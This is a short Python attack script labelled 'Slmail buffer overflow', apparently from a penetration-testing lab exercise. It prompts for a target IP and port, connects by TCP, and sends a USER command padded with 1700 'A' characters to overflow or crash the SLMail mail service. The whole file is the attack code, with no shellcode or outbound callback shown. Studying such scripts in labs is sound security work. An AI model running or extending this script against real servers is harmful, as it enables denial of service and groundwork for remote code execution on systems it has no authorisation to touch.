#!/usr/bin/python3

import sys,socket

print("*******Slmail buffer overflow********")
ip_address=input("Enter the IP address\n")
port=input("Enter the port numeber\n")


if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*30)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*30)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port)>0):
    buffer=1700
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address,int(port)))
    print(f"Sending buffer size --> {buffer}")
    s.send(b"USER HRISHI" + b"\r\n")
    s.send(b"USER " + b"A" * buffer + b"\r\n")
    s.close()
